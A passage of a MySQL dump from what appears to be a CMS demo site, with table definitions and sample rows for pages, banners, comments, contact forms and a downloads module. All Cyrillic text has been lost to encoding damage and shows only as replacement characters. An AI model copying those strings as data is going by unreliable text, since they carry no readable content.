  `document_meta_robots` enum('index,follow','index,nofollow','noindex,nofollow') NOT NULL default 'index,follow',
  `document_status` enum('1','0') NOT NULL default '1',
  `document_deleted` enum('0','1') NOT NULL default '0',
  `document_count_print` int(10) unsigned NOT NULL default '0',
  `document_count_view` int(10) unsigned NOT NULL default '0',
  `document_linked_navi_id` mediumint(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `document_alias` (`document_alias`),
  KEY `rubric_id` (`rubric_id`),
  KEY `document_status` (`document_status`),
  KEY `document_published` (`document_published`),
  KEY `document_expire` (`document_expire`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_documents`
-- 

INSERT INTO `cp_documents` VALUES (1, 1, '�������', '�������', 0, 0, 1276002455, 1, '0', '', '', 'index,follow', '1', '0', 10, 1065, 0);
INSERT INTO `cp_documents` VALUES (2, 1, '404-not-found', '404 - �������� �� ������', 0, 0, 1258259536, 1, '0', '', '', 'noindex,nofollow', '1', '0', 5, 306, 1);
INSERT INTO `cp_documents` VALUES (3, 1, '�-��������', '� ��������', 1250047140, 1881199140, 1275880968, 1, '0', '', '', 'index,follow', '1', '0', 0, 164, 0);
INSERT INTO `cp_documents` VALUES (4, 1, '�������-������', '������� ������', 1250986260, 1882138260, 1276918295, 1, '1', '', '', 'index,follow', '1', '0', 1, 75, 0);
INSERT INTO `cp_documents` VALUES (5, 1, 'kontakty', '��������', 1251677460, 1882829460, 1276370714, 1, '1', '', '', 'index,follow', '1', '0', 0, 156, 0);
INSERT INTO `cp_documents` VALUES (6, 2, '�������/2009-08-07/������-��������-�������', '������ �������� �������', 1249258200, 1880410200, 1275882565, 1, '1', '�������', '', 'index,follow', '1', '0', 1, 211, 0);
INSERT INTO `cp_documents` VALUES (7, 1, '�������', '����� ��������', 1251331860, 1882483860, 1278066151, 1, '1', '����� ��������', '', 'index,follow', '1', '0', 1, 164, 0);
INSERT INTO `cp_documents` VALUES (8, 2, '�������/2009-08-15/������-��������-�������', '������ �������� �������', 1250035860, 1881187860, 1275822034, 1, '1', '������� 2,�������� ������� 2', '', 'index,follow', '1', '0', 0, 124, 0);
INSERT INTO `cp_documents` VALUES (9, 1, 'primer-galerei', '������ �������', 1250986260, 1882138260, 1275883042, 1, '1', '�������,��������,�����������', '', 'index,follow', '1', '0', 2, 148, 0);
INSERT INTO `cp_documents` VALUES (10, 1, 'faq', 'FAQ', 1249085460, 1880237460, 1275882529, 1, '1', '������-�����', '������ ������ ������-�����', 'index,follow', '1', '0', 0, 75, 0);
INSERT INTO `cp_documents` VALUES (11, 1, 'sitemap', '����� �����', 1258400700, 1889552700, 1275822225, 1, '0', '', '', 'index,follow', '1', '0', 1, 41, 1);
INSERT INTO `cp_documents` VALUES (12, 1, 'kopiya-mordy', '����� �����', 1258427100, 1889579100, 1273609180, 1, '1', '', '', 'index,follow', '1', '0', 0, 9, 0);
INSERT INTO `cp_documents` VALUES (13, 1, 'google-maps', 'Google Maps', 1264240740, 1895392740, 1275822247, 1, '1', '', '', 'index,follow', '1', '0', 0, 11, 0);
INSERT INTO `cp_documents` VALUES (14, 2, '�������/������������-����-more', '������������ ���� more', 1263292140, 1894444140, 1274572572, 1, '1', '', '', 'index,follow', '1', '0', 0, 13, 5);
INSERT INTO `cp_documents` VALUES (15, 2, '�������/������������-����-����������-������������-������', '������������ ���� � ���������� ������������ ������', 1263302280, 1894454280, 1274572608, 2, '1', '������������� ���� � <����\\���/���> "������������" ���''���-2', '������������� ���� � <����\\���/���> "������������" ���''���-3', 'index,follow', '1', '0', 0, 14, 5);
INSERT INTO `cp_documents` VALUES (16, 1, 'osobennosti-shablona', '����������� �������', 1263322080, 1894474080, 1272800885, 2, '1', '����������� �������', '����������� �������', 'index,follow', '1', '0', 0, 21, 0);
INSERT INTO `cp_documents` VALUES (17, 3, 'tipografika', '�����������', 1263322320, 1894474320, 1272800389, 2, '1', '�����������', '�����������', 'index,follow', '1', '0', 0, 24, 0);
INSERT INTO `cp_documents` VALUES (18, 3, '960px-grid-system', '960px grid system', 1265461800, 949842600, 1278344340, 2, '0', '', '', 'index,follow', '1', '0', 0, 34, 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_log`
-- 

CREATE TABLE `cp_log` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `log_time` int(10) NOT NULL default '0',
  `log_ip` varchar(25) NOT NULL,
  `log_url` varchar(255) NOT NULL,
  `log_text` text NOT NULL,
  `log_type` tinyint(1) unsigned NOT NULL default '2',
  `log_rubric` tinyint(1) unsigned NOT NULL default '2',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_log`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_banner_categories`
-- 

CREATE TABLE `cp_modul_banner_categories` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `banner_category_name` char(100) NOT NULL default '',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_banner_categories`
-- 

INSERT INTO `cp_modul_banner_categories` VALUES (1, '��������� 1');
INSERT INTO `cp_modul_banner_categories` VALUES (2, '��������� 2');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_banners`
-- 

CREATE TABLE `cp_modul_banners` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `banner_category_id` smallint(3) unsigned NOT NULL default '1',
  `banner_file_name` char(255) NOT NULL default '',
  `banner_url` char(255) NOT NULL default '',
  `banner_priority` enum('0','1','2','3') NOT NULL default '0',
  `banner_name` char(100) NOT NULL default '',
  `banner_views` mediumint(5) unsigned NOT NULL default '0',
  `banner_clicks` mediumint(5) unsigned NOT NULL default '0',
  `banner_alt` char(255) NOT NULL default '',
  `banner_max_clicks` mediumint(5) unsigned NOT NULL default '0',
  `banner_max_views` mediumint(5) unsigned NOT NULL default '0',
  `banner_show_start` tinyint(1) unsigned NOT NULL default '0',
  `banner_show_end` tinyint(1) unsigned NOT NULL default '0',
  `banner_status` enum('1','0') NOT NULL default '1',
  `banner_target` enum('_blank','_self') NOT NULL default '_blank',
  `banner_width` smallint(3) unsigned NOT NULL default '0',
  `banner_height` smallint(3) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `banner_category_id` (`banner_category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_banners`
-- 

INSERT INTO `cp_modul_banners` VALUES (1, 1, 'banner.jpg', 'http://www.overdoze.ru', '1', 'Overdoze-Banner', 128, 0, '������� CMS, ���������� �������, ����� � ��������� �������������', 0, 0, 0, 0, '1', '_self', 0, 0);
INSERT INTO `cp_modul_banners` VALUES (2, 1, 'banner2.gif', 'http://www.google.de', '1', 'Google-Banner', 111, 0, '�������� ���� Google', 0, 0, 0, 0, '1', '_blank', 0, 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_comment_info`
-- 

CREATE TABLE `cp_modul_comment_info` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `parent_id` int(10) unsigned NOT NULL default '0',
  `document_id` int(10) unsigned NOT NULL default '0',
  `comment_author_name` varchar(255) NOT NULL,
  `comment_author_id` int(10) unsigned NOT NULL default '0',
  `comment_author_email` varchar(255) NOT NULL,
  `comment_author_city` varchar(255) NOT NULL,
  `comment_author_website` varchar(255) NOT NULL,
  `comment_author_ip` varchar(15) NOT NULL,
  `comment_published` int(10) unsigned NOT NULL default '0',
  `comment_changed` int(10) unsigned NOT NULL default '0',
  `comment_text` text NOT NULL,
  `comment_status` tinyint(1) unsigned NOT NULL default '1',
  `comments_close` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `document_id` (`document_id`),
  KEY `parent_id` (`parent_id`),
  KEY `status` (`comment_status`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_comment_info`
-- 

INSERT INTO `cp_modul_comment_info` VALUES (1, 0, 6, '�. �''��������������', 2, 'admin@ave.ru', '', '', '127.0.0.1', 1269959742, 0, '����� ������������, ��� ������������� ������ ������� ���� �������, ��� ���� ����� �, �, I, � ������������� �������������� ������������������, �����������������, �������������������� � ������������������� ��������. ������� ���������� ��������� �� �������� ���������, ���� � �������� ������� ��������. ����� ��������� ������������ �� ���� ��� ��������� ��������, ��� ���� ����� �, �, I, � ������������� �������������� ������������������, �����������������, �������������������� � ������������������� ��������. �������� ��������� �� �������� ������������ �������������� ��������, �� �������� ������ �����������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (2, 0, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959769, 0, '��������� ������������� ����������� ������� �����, ���� � �������� ������� ��������. �������, ������������ ��������� ��������, ������ ������� ������ ��������� ���������� ������������� � ��������������, ��� ������� ��� ������� ����� � ����������� ����. ������������, �������, ��������������. �� ����� ����������� �������� ������ ��� ������������� � ��������, �������������� ���������, ������ ������� ������������ �������������� ��������, ������� ��������� ����������. �������� ���������� ������������ ����������� �������������� ��������, �������� ���������, ������� ������������ ����� ������� ������� ��� �� ��������� ��� ��������� �������� ��������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (3, 1, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959796, 1269974114, '�������, �������������, ��������������� ������ �����, ������� ��������� ����������. ���� ������� ��������� ���, tertium n�n datur. �������, ���������� ������� ������� �����, �������� ����� ���������. ��������, �������, ����������� ����� �����, �� �������� ������ �����������. ��������� ��������� � ������������ ����������� ������� �����, ������� ���������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (4, 3, 6, '�. �''��������������', 2, 'admin@ave.ru', '', '', '127.0.0.1', 1269959821, 0, '����������� ������������. ����������� ����������� ������������ �������, �� �������� ������ �����������. �������� �����������, �������� ��������� �������������� ��������, �������� ����� ���������. ���������� ������������. ��������� ������������ ����������� ����������, ������ ������� ������ ��������� ���������� ������������� � ��������������, ��� ������� ��� ������� ����� � ����������� ����. ����� ����� ���������� ������ ������������ ���, �������� ����� ���������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (5, 4, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959843, 0, '�������� ������������ ������� ����������, �������� ����� ���������. ������������ �������� ����������. ���������� ��������� �������. ����� ������������, ��� �������� ������������ ����������� ���������, ������� ��������� ����������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (6, 2, 6, '�. �''��������������', 2, 'admin@ave.ru', '', '', '127.0.0.1', 1269960075, 0, '�� ����� ����������� �������� ������ ��� ������������� � ��������, �������������� ���������, ������ ����� ����� ��������������� ��������� �� �������� ����� �������� ����, �������� ����� ���������. ������� ���������� �������������� ���������������� ����������� �����, ��� ���� ����� �, �, I, � ������������� �������������� ������������������, �����������������, �������������������� � ������������������� ��������. ����� ���������� ��������� � ������������ ����� �����, ������� ��������� ����������. �������� �����. ��������� ������������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (7, 1, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269959978, 1269977724, '������ � ���� ��������� ���������� �������������� �������, �������� ���������, ������� ������������ ����� ������� ������� ��� �� ��������� ��� ��������� �������� ��������. ���������, ��� ������� �������, ������������. ������������ �������������� �������, �������� ����� ���������. �����, ������� � ������ �������, ��� ����� ����������. ���������� ������������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (8, 4, 6, 'Admin', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1269960028, 0, '�������� ��������������� ����������� �������������� ��������, �������� ���������, ������� ������������ ����� ������� ������� ��� �� ��������� ��� ��������� �������� ��������. ����� �����, �������������, �����. ����������� �����, �������, ����������� ����, ����� ����� ��������� �������������. ����������� ��������������� ���������������� ������� �����, ���� � �������� ������� ��������. ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (9, 5, 6, 'User', 2, 'user@ave.ru', '', '', '127.0.0.1', 1269963278, 0, '����� ������������', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (11, 0, 8, '�.��''��������������', 1, 'admin@ave.ru', '���"���� ��''���', 'ave.ru', '127.0.0.1', 1274222936, 1274223200, '� ����� � ���� ����� �����������, ��� ���������� ������ ����� ����������� ������ ����� � ��� ��������� �������� ���������� ������� ����� ���������. ������� ���� ����������� ������, ���� ��� ������� �����-���������  ', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (15, 11, 8, '��������', 0, 'outsider@ave.ru', '', '', '127.0.0.1', 1275691927, 0, '������� Fluid 960 Grid System ��������� �� ���� ����� ����� ���� � ��� 960 Grid System, � �������������� �������� MooTools � jQuery  JavaScript ���������. ���� �������� ���� �������� ����������� ���� �����, ������ Transcending CSS, who advocates a content-out approach to rapid interactive prototyping, crediting Jason Santa Maria with the grey box method.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (12, 0, 8, '�.��''��������������', 1, 'admin@ave.ru', '���"���� ��''���', 'ave.ru', '127.0.0.1', 1274223154, 1274223272, '���������� ��������� ���������� �� �� ���� ��������� � ����� ����� ������� ���������. ���������, ���������� �������� ���������� ����������� ����������� ������������� ���-���� ������, ��� �� �����, ��� ����� ������� � ������ ����� 82-� ������� ������. �� ��������������� �������� ������� ������, ���������� �������� ������, ���������� �����, ������� �����������.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (16, 11, 8, '��������', 0, 'outsider@ave.ru', '', '', '127.0.0.1', 1275692456, 0, '������� Fluid 960 Grid System ��������� �� ���� ����� ����� ���� � ��� 960 Grid System, � �������������� �������� MooTools � jQuery  JavaScript ���������. ���� �������� ���� �������� ����������� ���� �����, ������ Transcending CSS, who advocates a content-out approach to rapid interactive prototyping, crediting Jason Santa Maria with the grey box method.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (17, 15, 8, '�. �''����', 1, 'admin@ave.ru', '', '', '127.0.0.1', 1275692682, 0, '������� Fluid 960 Grid System ��������� �� ���� ����� ����� ���� � ��� 960 Grid System, � �������������� �������� MooTools � jQuery  JavaScript ���������. ���� �������� ���� �������� ����������� ���� �����, ������ Transcending CSS, who advocates a content-out approach to rapid interactive prototyping, crediting Jason Santa Maria with the grey box method.', 1, 0);
INSERT INTO `cp_modul_comment_info` VALUES (18, 17, 8, '�. �''����', 0, 'admin@ave.ru', '', '', '127.0.0.1', 1275694601, 0, '� ����� � ���� ����� �����������, ��� ���������� ������ ����� ����������� ������ ����� � ��� ��������� �������� ���������� ������� ����� ���������. ������� ���� ����������� ������, ���� ��� ������� �����-���������\n� ����� � ���� ����� �����������, ��� ���������� ������ ����� ����������� ������ ����� � ��� ��������� �������� ���������� ������� ����� ���������. ������� ���� ����������� ������, ���� ��� ������� �����-���������', 1, 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_comments`
-- 

CREATE TABLE `cp_modul_comments` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `comment_max_chars` smallint(3) unsigned NOT NULL default '1000',
  `comment_user_groups` char(255) NOT NULL,
  `comment_need_approve` enum('0','1') NOT NULL default '0',
  `comment_active` enum('1','0') NOT NULL default '1',
  `comment_use_antispam` enum('1','0') NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_comments`
-- 

INSERT INTO `cp_modul_comments` VALUES (1, 1500, '1,2,3,4', '0', '1', '1');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_contact_fields`
-- 

CREATE TABLE `cp_modul_contact_fields` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `contact_form_id` mediumint(5) unsigned NOT NULL default '0',
  `contact_field_type` varchar(25) NOT NULL default 'text',
  `contact_field_position` smallint(3) unsigned NOT NULL default '10',
  `contact_field_title` tinytext NOT NULL,
  `contact_field_required` enum('0','1') NOT NULL default '0',
  `contact_field_default` longtext NOT NULL,
  `contact_field_status` enum('1','0') NOT NULL default '1',
  `contact_field_size` smallint(3) unsigned NOT NULL default '300',
  `contact_field_newline` enum('1','0') NOT NULL default '1',
  `contact_field_datatype` enum('anysymbol','onlydecimal','onlychars') NOT NULL default 'anysymbol',
  `contact_field_max_chars` varchar(20) NOT NULL,
  `contact_field_value` varchar(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_contact_fields`
-- 

INSERT INTO `cp_modul_contact_fields` VALUES (1, 1, 'textfield', 5, '���������', '1', '', '1', 698, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (2, 1, 'dropdown', 50, '��� �� ������� ��� ����?', '0', '�����,������,�����,����� ���� �����', '1', 200, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (3, 1, 'fileupload', 50, '���������� ����', '1', '', '1', 600, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (4, 1, 'fileupload', 50, '���������� ����', '0', '', '1', 600, '1', 'anysymbol', '', '');
INSERT INTO `cp_modul_contact_fields` VALUES (5, 1, 'checkbox', 55, '�������', '1', '������� ���', '1', 300, '1', 'anysymbol', '', '�� ��������� ������������ ����');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_contact_info`
-- 

CREATE TABLE `cp_modul_contact_info` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `contact_form_number` varchar(20) NOT NULL,
  `contact_form_id` mediumint(5) unsigned NOT NULL default '0',
  `contact_form_in_date` int(10) unsigned NOT NULL default '0',
  `contact_form_in_email` varchar(255) NOT NULL,
  `contact_form_in_subject` varchar(255) NOT NULL,
  `contact_form_in_message` longtext NOT NULL,
  `contact_form_in_attachment` tinytext NOT NULL,
  `contact_form_out_date` int(10) unsigned NOT NULL default '0',
  `contact_form_out_email` varchar(255) NOT NULL,
  `contact_form_out_sender` varchar(255) NOT NULL,
  `contact_form_out_message` longtext NOT NULL,
  `contact_form_out_attachment` tinytext NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_contact_info`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_contacts`
-- 

CREATE TABLE `cp_modul_contacts` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `contact_form_title` varchar(100) NOT NULL,
  `contact_form_mail_max_chars` smallint(3) unsigned NOT NULL default '20000',
  `contact_form_receiver` varchar(100) NOT NULL,
  `contact_form_receiver_multi` varchar(255) NOT NULL,
  `contact_form_antispam` enum('1','0') NOT NULL default '1',
  `contact_form_max_upload` mediumint(5) unsigned NOT NULL default '500',
  `contact_form_subject_show` enum('1','0') NOT NULL default '1',
  `contact_form_subject_default` varchar(255) NOT NULL default '���������',
  `contact_form_allow_group` varchar(255) NOT NULL default '1,2,3,4',
  `contact_form_send_copy` enum('1','0') NOT NULL default '1',
  `contact_form_message_noaccess` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_contacts`
-- 

INSERT INTO `cp_modul_contacts` VALUES (1, '�������� �����', 5000, 'formsg@mail.ru', '', '1', 120, '0', '', '1,2,3,4', '0', '� ��� ������������ ���� ��� ������������� ���� �����.');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_comments`
-- 

CREATE TABLE `cp_modul_download_comments` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `FileId` int(10) unsigned NOT NULL default '0',
  `Datum` int(14) unsigned NOT NULL default '0',
  `title` varchar(100) NOT NULL,
  `comment_text` text NOT NULL,
  `Name` varchar(100) NOT NULL default '',
  `Email` varchar(100) NOT NULL default '',
  `Ip` varchar(200) NOT NULL default '',
  `Aktiv` tinyint(1) unsigned NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_comments`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_files`
-- 

CREATE TABLE `cp_modul_download_files` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Autor` varchar(255) default NULL,
  `AutorUrl` varchar(255) default NULL,
  `Version` varchar(255) default NULL,
  `Sprache` varchar(255) default '1',
  `KatId` int(10) unsigned NOT NULL default '1',
  `Name` varchar(255) NOT NULL default '',
  `description` text NOT NULL,
  `Limitierung` text,
  `status` tinyint(1) unsigned NOT NULL default '1',
  `Methode` enum('ftp','http','local') NOT NULL default 'local',
  `Pfad` varchar(255) NOT NULL default '',
  `Downloads` int(10) unsigned NOT NULL default '0',
  `Groesse` int(14) unsigned NOT NULL default '0',
  `GroesseEinheit` enum('kb','mb') NOT NULL default 'kb',
  `Datum` int(14) unsigned NOT NULL default '0',
  `Geaendert` int(14) unsigned default NULL,
  `Os` varchar(255) NOT NULL default '1',
  `Lizenz` mediumint(2) default NULL,
  `Wertung` enum('1','2','3','4','5') NOT NULL default '5',
  `Wertungen_top` int(14) unsigned NOT NULL default '0',
  `Wertungen_flop` int(14) unsigned NOT NULL default '0',
  `Wertungen_ip` text NOT NULL,
  `Wertungen_ja` tinyint(1) unsigned NOT NULL default '1',
  `RegGebuehr` varchar(200) default NULL,
  `Mirrors` text,
  `Screenshot` varchar(255) default NULL,
  `Autor_Erstellt` int(14) unsigned NOT NULL default '1',
  `Autor_Geandert` int(10) unsigned NOT NULL default '1',
  `Kommentar_ja` int(10) unsigned NOT NULL default '1',
  `Downloads_Max` int(10) unsigned NOT NULL default '0',
  `Pay` varchar(10) default '0',
  `Pay_val` int(10) unsigned NOT NULL default '0',
  `Pay_Type` smallint(2) unsigned NOT NULL default '0',
  `Only_Pay` tinyint(1) unsigned NOT NULL default '1',
  `Excl_Pay` tinyint(1) unsigned NOT NULL default '0',
  `Excl_Chk` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_files`
-- 

INSERT INTO `cp_modul_download_files` VALUES (8, 'Overdoze', '', '5.0', '1', 31, '���������', '<p>����� (Cricetus), ��� ��������, ���. �������; �������, �������. ����, ������. ����� � ����; ������� �������� �����; ���������� ���� �� �����. �������� �����; ���. ��������, ������; ����� �������� ������ � ��� �� 6 �� 12 ���������. ������������ (C. vulgaris) � ��������� ������; �������� (C. arenarius) � ������. �����. �� �����, ����� � ������; ���������� (C. songarus), ������� �������, �� ���. ������.</p>', '��� �����������', 1, 'local', 'Changelog.pdf', 450, 0, 'kb', 1164046575, 1232403514, '8', 3, '5', 32, 5, '', 1, '����', '\r\nhttp://www.domain.ru', '/uploads/downloads/hamster1.jpg', 1, 1, 1, 5, '45', 1, 0, 1, 0, 0);
INSERT INTO `cp_modul_download_files` VALUES (11, '', '', '12', '1', 30, '����������', '����� (Cricetus), ��� ��������, ���. �������; �������, �������. ����, ������. ����� � ����; ������� �������� �����; ���������� ���� �� �����. �������� �����; ���. ��������, ������; ����� �������� ������ � ��� �� 6 �� 12 ���������. ������������ (C. vulgaris) � ��������� ������; �������� (C. arenarius) � ������. �����. �� �����, ����� � ������; ���������� (C. songarus), ������� �������, �� ���. ������.', '&nbsp;', 1, 'local', 'HandbuchKoobi5.pdf', 69, 0, 'kb', 1164047584, 1232403523, '9', 3, '5', 20, 3, '', 1, '', '', '/uploads/downloads/hamster5.jpg', 1, 1, 1, 0, '12', 1, 0, 1, 0, 0);
INSERT INTO `cp_modul_download_files` VALUES (12, '', 'www.bitmap.ru', '1', '1', 28, '����-�����', '����� (Cricetus), ��� ��������, ���. �������; �������, �������. ����, ������. ����� � ����; ������� �������� �����; ���������� ���� �� �����. �������� �����; ���. ��������, ������; ����� �������� ������ � ��� �� 6 �� 12 ���������. ������������ (C. vulgaris) � ��������� ������; �������� (C. arenarius) � ������. �����. �� �����, ����� � ������; ���������� (C. songarus), ������� �������, �� ���. ������.', '&nbsp;', 1, 'local', 'Changelog.pdf', 0, 0, 'kb', 1232403638, NULL, '3', 1, '2', 0, 0, '', 1, '', '', '/uploads/downloads/hamster4.jpg', 1, 1, 1, 0, '4', 1, 0, 1, 0, 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_kat`
-- 

CREATE TABLE `cp_modul_download_kat` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `parent_id` int(10) unsigned NOT NULL default '0',
  `KatName` varchar(255) NOT NULL default '',
  `position` int(8) unsigned NOT NULL default '1',
  `KatBeschreibung` text NOT NULL,
  `user_group` varchar(255) NOT NULL default '1|2|3|4|5|6',
  `Bild` varchar(200) default NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_kat`
-- 

INSERT INTO `cp_modul_download_kat` VALUES (24, 0, '������ ������', 1, '', '1|12|6|2|8|7|4|5|11|3', 'koobi.gif');
INSERT INTO `cp_modul_download_kat` VALUES (25, 24, '�����', 1, '����� ������� ���������� ����� �������', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (26, 24, '�����', 2, '����� ������������ ����� ����� �������� ���������', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (27, 0, '������� ������', 1, '����� ������� ��� ��������� ������ ������', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (28, 27, '������ ��������', 1, '�������� ������ � ������ �� ������������������', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (29, 27, '������ �������', 2, '�������� �������� �� �����', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (30, 25, '��������', 1, '�� ���������� �������', '1|2|4|3', '');
INSERT INTO `cp_modul_download_kat` VALUES (31, 25, '�������', 2, '���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ���� ��� ���� ', '1|2|4|3', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_lizenzen`
-- 

CREATE TABLE `cp_modul_download_lizenzen` (
  `Id` smallint(2) unsigned NOT NULL auto_increment,
  `Name` char(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_lizenzen`
-- 

INSERT INTO `cp_modul_download_lizenzen` VALUES (1, 'Freeware');
INSERT INTO `cp_modul_download_lizenzen` VALUES (2, 'Shareware');
INSERT INTO `cp_modul_download_lizenzen` VALUES (3, '��� ��������');
INSERT INTO `cp_modul_download_lizenzen` VALUES (4, 'GNU LGPL');
INSERT INTO `cp_modul_download_lizenzen` VALUES (5, 'GPL');
INSERT INTO `cp_modul_download_lizenzen` VALUES (6, 'LGPL');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_log`
-- 

CREATE TABLE `cp_modul_download_log` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `FileId` int(14) unsigned NOT NULL default '0',
  `Datum` char(10) NOT NULL,
  `Ip` char(100) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_log`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_os`
-- 

CREATE TABLE `cp_modul_download_os` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` char(200) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_os`
-- 

INSERT INTO `cp_modul_download_os` VALUES (1, 'Windows 95');
INSERT INTO `cp_modul_download_os` VALUES (2, 'Windows 98');
INSERT INTO `cp_modul_download_os` VALUES (3, 'Windows ME');
INSERT INTO `cp_modul_download_os` VALUES (4, 'Windows 2000');
INSERT INTO `cp_modul_download_os` VALUES (5, 'Windows 2003');
INSERT INTO `cp_modul_download_os` VALUES (6, 'Windows NT');
INSERT INTO `cp_modul_download_os` VALUES (7, 'Windows XP');
INSERT INTO `cp_modul_download_os` VALUES (8, 'Windows Vista');
INSERT INTO `cp_modul_download_os` VALUES (9, 'Independent');
INSERT INTO `cp_modul_download_os` VALUES (10, 'Handheld');
INSERT INTO `cp_modul_download_os` VALUES (11, 'Linux');
INSERT INTO `cp_modul_download_os` VALUES (12, 'Mac');
INSERT INTO `cp_modul_download_os` VALUES (13, 'Mac OS 7.x');
INSERT INTO `cp_modul_download_os` VALUES (14, 'Mac OS 8.x');
INSERT INTO `cp_modul_download_os` VALUES (15, 'Mac OS 9.x');
